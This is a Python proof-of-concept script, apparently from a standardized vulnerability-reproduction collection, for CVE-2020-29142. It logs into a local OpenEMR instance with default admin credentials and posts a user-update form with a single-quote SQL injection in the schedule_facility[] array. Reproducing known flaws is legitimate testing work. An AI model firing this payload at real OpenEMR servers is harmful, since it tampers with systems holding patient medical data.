#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2020-29142 
[TYPE] SQL injection
[METHOD] POST
[CRASH_FIELDS] schedule_facility
[TARGET_URL] http://localhost/openemr/interface/usergroup/usergroup_admin.php
[PARAMS] get_admin_id=0&admin_id=&check_acl=&mname=&lname=Administrator&facility_id=3&taxid=&drugid=&upin=&see_auth=1&npi=&job=&main_menu_role=standard&patient_menu_role=standard&access_group%5B%5D=Administrators&comments=&id=1&mode=update&privatemode=user_admin&secure_pwd=1&schedule_facility[]=1&schedule_facility[]=1'
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then POST to /interface/usergroup/usergroup_admin.php
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2020-29142 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/usergroup/usergroup_admin.php'
    poc_payload = {
        'get_admin_id': '0',
        'admin_id': '',
        'check_acl': '',
        'mname': '',
        'lname': 'Administrator',
        'facility_id': '3',
        'taxid': '',
        'drugid': '',
        'upin': '',
        'see_auth': '1',
        'npi': '',
        'job': '',
        'main_menu_role': 'standard',
        'patient_menu_role': 'standard',
        'access_group[]': 'Administrators',
        'comments': '',
        'id': '2',
        'mode': 'update',
        'privatemode': 'user_admin',
        'secure_pwd': '1',
        'schedule_facility[]': "1'"  # SQL injection payload in array parameter
    }
    
    # Run authenticated POC test using the helper function
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_payload,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
